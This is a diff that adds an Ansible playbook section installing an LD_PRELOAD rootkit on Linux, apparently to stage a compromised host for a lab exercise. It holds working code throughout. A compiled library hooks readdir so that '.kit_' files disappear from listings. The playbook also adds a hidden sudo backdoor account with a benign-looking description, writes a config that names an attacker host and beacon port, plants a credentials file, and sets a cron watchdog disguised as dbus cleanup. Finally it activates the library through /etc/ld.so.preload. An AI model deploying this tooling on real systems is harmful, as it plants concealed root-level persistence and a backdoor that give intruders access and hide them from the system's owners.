@@ -1,0 +1,145 @@
+---
+# ── Compile phase (skipped on spread targets) ────────────────────────────────
+
+- name: Install build tools
+  apt:
+    name:
+      - gcc
+      - libc6-dev
+    state: present
+    update_cache: yes
+  when: compile_library | bool
+
+- name: Write rootkit shared library source
+  copy:
+    dest: "{{ rootkit_src }}"
+    owner: root
+    group: root
+    mode: "0600"
+    content: |
+      /*
+       * libsysmon — system monitoring helper library
+       * Loaded via /etc/ld.so.preload
+       */
+      #define _GNU_SOURCE
+      #include <string.h>
+      #include <dlfcn.h>
+      #include <dirent.h>
+
+      #define KIT_PFX ".kit_"
+      #define KIT_LEN 5
+
+      struct dirent *readdir(DIR *d) {
+          static struct dirent *(*real)(DIR *);
+          struct dirent *e;
+          if (!real) real = dlsym(RTLD_NEXT, "readdir");
+          do { e = real(d); } while (e && strncmp(e->d_name, KIT_PFX, KIT_LEN) == 0);
+          return e;
+      }
+
+      struct dirent64 *readdir64(DIR *d) {
+          static struct dirent64 *(*real)(DIR *);
+          struct dirent64 *e;
+          if (!real) real = dlsym(RTLD_NEXT, "readdir64");
+          do { e = real(d); } while (e && strncmp(e->d_name, KIT_PFX, KIT_LEN) == 0);
+          return e;
+      }
+  when: compile_library | bool
+
+- name: Compile rootkit shared library
+  command: >
+    gcc -shared -fPIC -Wall
+    -o {{ rootkit_lib }}
+    {{ rootkit_src }} -ldl
+  args:
+    creates: "{{ rootkit_lib }}"
+  when: compile_library | bool
+
+- name: Set library permissions
+  file:
+    path: "{{ rootkit_lib }}"
+    owner: root
+    group: root
+    mode: "0755"
+
+# ── Hidden file system artifacts ─────────────────────────────────────────────
+
+- name: Create hidden rootkit config directory
+  file:
+    path: "{{ rootkit_conf_dir }}"
+    state: directory
+    owner: root
+    group: root
+    mode: "0700"
+
+- name: Create rootkit configuration file
+  copy:
+    dest: "{{ rootkit_conf_dir }}/config"
+    owner: root
+    group: root
+    mode: "0600"
+    content: |
+      # sysmon runtime configuration
+      attacker={{ attacker_host }}
+      beacon_port=4444
+      beacon_interval=120
+      hidden_prefix=.kit_
+      hidden_user={{ hidden_user }}
+      lib={{ rootkit_lib }}
+
+- name: Initialise rootkit activity log
+  copy:
+    dest: "{{ rootkit_log }}"
+    owner: root
+    group: root
+    mode: "0600"
+    content: |
+      [install] rootkit deployed via dropper
+
+- name: Create hidden credentials file
+  copy:
+    dest: "/home/{{ username }}/.kit_credentials.txt"
+    owner: "{{ username }}"
+    group: "{{ username }}"
+    mode: "0600"
+    content: |
+      # harvested credentials
+      cyrano:cyrano
+      {{ hidden_user }}:{{ hidden_user_pass }}
+      root:toor
+
+
+
+
+# ── Hidden privileged user ────────────────────────────────────────────────────
+
+- name: Create hidden privileged backdoor user
+  user:
+    name: "{{ hidden_user }}"
+    password: "{{ hidden_user_pass | password_hash('sha512') }}"
+    shell: /bin/bash
+    groups: sudo
+    append: yes
+    comment: "System Monitor Daemon"
+
+# ── Cron watchdog ─────────────────────────────────────────────────────────────
+
+- name: Create cron watchdog for rootkit beacon persistence
+  copy:
+    dest: "{{ cron_job_file }}"
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      # dbus session cleanup
+      * * * * * root /bin/bash -c 'pgrep -f ".kit_beacon" > /dev/null || systemctl start polkit-agent.service' 2>/dev/null
+
+# ── Activate rootkit (write /etc/ld.so.preload LAST) ─────────────────────────
+
+- name: Activate LD_PRELOAD rootkit system-wide
+  copy:
+    dest: /etc/ld.so.preload
+    owner: root
+    group: root
+    mode: "0644"
+    content: "{{ rootkit_lib }}\n"
